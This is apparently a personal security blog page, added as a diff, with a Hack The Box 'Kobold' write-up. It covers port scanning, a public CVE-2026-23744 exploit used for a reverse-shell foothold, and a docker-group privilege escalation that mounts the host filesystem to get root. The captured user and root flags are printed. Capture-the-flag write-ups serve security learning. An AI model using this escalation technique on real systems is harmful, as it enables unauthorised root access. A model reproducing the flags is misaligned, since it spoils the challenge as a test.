@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>HTB - Season10 - Writeups - Kobold</title>
+   <link rel="stylesheet" href="/static/style.css">
+   <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+   <canvas class="matrix-bg" id="matrix"></canvas>
+
+   <header>
+      <div class="header-content">
+         <div class="terminal-prompt">k0d14k@kali:~#</div>
+         <div class="img-text">
+               <img src="/static/images/avatar.png" width="100rem">
+               <div class="text">
+                  <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                  <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+               </div>
+         </div>
+      </div>
+   </header>
+
+   <nav>
+      <ul>
+         <li><a href="/">Home</a></li>
+         <li><a href="/#about">Whoami</a></li>
+         <li><a href="/#skills">Skills</a></li>
+         <li><a href="/#projects">Projects</a></li>
+         <li><a href="/#contact">Contacts</a></li>
+      </ul>
+   </nav>
+
+   <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/kobold.png" alt="500rem">   
+        <h1>Kobold - HTB Season 10</h1>
+
+        <p>
+            <b>Categories</b>: #cve-2026-23744, #docker-privesc
+        </p>
+        
+        <hr>
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>
+
+        <section id="tcp-scan">
+            <h2>cat tcp-scan</h2>
+
+            <div class="code">
+                # Nmap 7.95 scan initiated Thu Apr  2 13:23:50 2026 as: nmap -sS -sC -v -O -oN tcp-scan-advance.txt -p - kobold.htb <br>
+                Nmap scan report for kobold.htb (10.129.24.160) <br>
+                Host is up (0.045s latency). <br>
+                Not shown: 65531 closed tcp ports (reset) <br>
+                PORT     STATE SERVICE <br>
+                22/tcp   open  ssh <br>
+                | ssh-hostkey:  <br>
+                |   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA) <br>
+                |_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519) <br>
+                80/tcp   open  http <br>
+                | http-methods:  <br>
+                |_  Supported Methods: GET HEAD POST OPTIONS <br>
+                |_http-title: Did not follow redirect to https://kobold.htb/ <br>
+                443/tcp  open  https <br>
+                | ssl-cert: Subject: commonName=kobold.htb <br>
+                | Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb <br>
+                | Issuer: commonName=kobold.htb <br>
+                | Public Key type: rsa <br>
+                | Public Key bits: 2048 <br>
+                | Signature Algorithm: sha256WithRSAEncryption <br>
+                | Not valid before: 2026-03-15T15:08:55 <br>
+                | Not valid after:  2125-02-19T15:08:55 <br>
+                | MD5:   c49e:c4d5:d4a0:e473:00bc:8df8:cc00:98ac <br>
+                |_SHA-1: a231:1d00:d15b:2007:eff5:957d:0561:265a:bb90:6906 <br>
+                | tls-alpn:  <br>
+                |   http/1.1 <br>
+                |   http/1.0 <br>
+                |_  http/0.9 <br>
+                |_ssl-date: TLS randomness does not represent time <br>
+                | http-methods:  <br>
+                |_  Supported Methods: GET HEAD <br>
+                |_http-title: Kobold Operations Suite <br>
+                3552/tcp open  taserver <br>
+                Device type: general purpose|router <br>
+                Running: Linux 5.X, MikroTik RouterOS 7.X <br>
+                OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 <br>
+                OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) <br>
+                Uptime guess: 23.464 days (since Tue Mar 10 01:15:59 2026) <br>
+                Network Distance: 2 hops <br>
+                TCP Sequence Prediction: Difficulty=261 (Good luck!) <br>
+                IP ID Sequence Generation: All zeros <br>
+                <br>
+                Read data files from: /usr/bin/../share/nmap <br>
+                OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . <br>
+                # Nmap done at Thu Apr  2 13:24:37 2026 -- 1 IP address (1 host up) scanned in 46.78 seconds <br>
+                ``` <br>
+            </div>
+
+            <p>
+                The currently open ports are <span class="highlight">22</span>, <span class="highlight">80</span>, 
+                <span class="highlight">443</span> and <span class="highlight">3552</span>. Ports 80 and 443 redirect 
+                to each other and have nothing of interest, while port <span class="highlight">3552</span> hosts a 
+                platform called <span class="highlight">Arcane App - v 1.13.0</span>. <br>
+            </p>
+        </section>
+
+        <section id="fuzzing">
+            <h2>cat fuzzing</h2>
+
+            <p>Fuzzing reveals the presence of two subdomains: <span class="highlight">mcp</span> and <span class="highlight">bin</span>:</p>
+
+            <img src="images/Pasted image 20260402143622.png" width="1000rem">
+
+            <p>
+                This time I used Burp to probe the domains (avoiding adding both unnecessarily to <span class="highlight">/etc/hosts</span>) 
+                and discovered that the first one hosts an instance of <span class="highlight">MCPJam Inspector</span>:
+            </p>
+            
+            <img src="images/Pasted image 20260402143759.png" width="1000rem">
+
+            <p>
+                Not being familiar with this technology, I searched Google for exploits and found that it is affected by a 
+                2026 CVE, specifically <a target="_blank" href="https://github.com/FrenzisRed/CVE-2026-23744">CVE-2026-23744</a> whose PoC is publicly available.
+            </p>
+        </section>
+
+        <section id="foothold">
+            <h2>cat foothold</h2>
+            <p>To obtain the reverse shell it is sufficient to run the PoC mentioned above while setting up a listener waiting for the connection:</p>
+            <img src="images/Pasted image 20260402144742.png" width="1000rem">
+            <p>After establishing the connection, I spawn a TTY shell and retrieve the user flag.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>cat privilege-escalation</h2>
+            
+            <p>
+                Running <span class="highlight">sudo -l</span> requires a password, so that is not the right path. I therefore run 
+                <span class="highlight">linpeas.sh</span> and from its results I discover that Docker is available.
+            </p>
+
+            <p>
+                Running <span class="highlight">docker ps -a</span> confirms this, but we are in a state where Docker cannot be used 
+                due to the group configuration:
+            </p>
+
+            <img src="images/Pasted image 20260402145659.png" width="1000rem">
+
+            <p>To work around the issue I check for the existence of the docker group:</p>
+
+            <div class="code">
+                ben@kobold:~$ cat /etc/group |grep docker <br>
+                docker:x:111:alice <br>
+                ben@kobold:~$ 
+            </div>
+
+            <p>
+                The group exists but we are not a member of it. However, this allows us to skip all the sudo-requiring commands from the 
+                <a target="_blank" href="https://docs.docker.com/engine/install/linux-postinstall/">Docker post-installation guide</a> and directly run 
+                <span class="highlight">newgrp docker</span> to load it into the current session:
+            </p>
+
+            <img src="images/Pasted image 20260402152806.png" width="1000rem">
+
+            <p>
+                I tried to run an Ubuntu container but couldn't reach Docker Hub to download the image. I therefore pulled the image on my own machine, 
+                saved it, transferred it to the victim machine, and imported it so we could run our container:
+            </p>
+
+            <p>From the attacker machine:</p>
+            <div class="code">
+                docker save -o ubuntu.tar ubuntu
+            </div>
+
+            <p>From the victim machine</p>
+            <div class="code">
+                docker load -i ubuntu.tar
+            </div>
+
+            <p>Now all that's left is to run the container:</p>
+
+            <div class="code">
+                ben@kobold:/tmp$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/bash <br>
+                root@6dd5865f2bdd:/# whoami && id && hostname <br>
+                root <br>
+                uid=0(root) gid=0(root) groups=0(root) <br>
+                6dd5865f2bdd <br>
+                root@6dd5865f2bdd:/# cat /root/root.txt <br>
+                83b58057023b62dacda5b0378cff7877 <br>
+                root@6dd5865f2bdd:/# 
+            </div>
+        </section>
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> 13e275c647f98abceb64f3795b0c00fa</h3>
+            <h3><b>Root Flag:</b> 83b58057023b62dacda5b0378cff7877</h3>
+        </section>
+    </main>
+
+
+   <footer>
+      <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+      <p>&copy; 2025 K0D14K</p>
+   </footer>
+
+   <script src="/static/script.js"></script>
+   <script> lister() </script>
+</body>
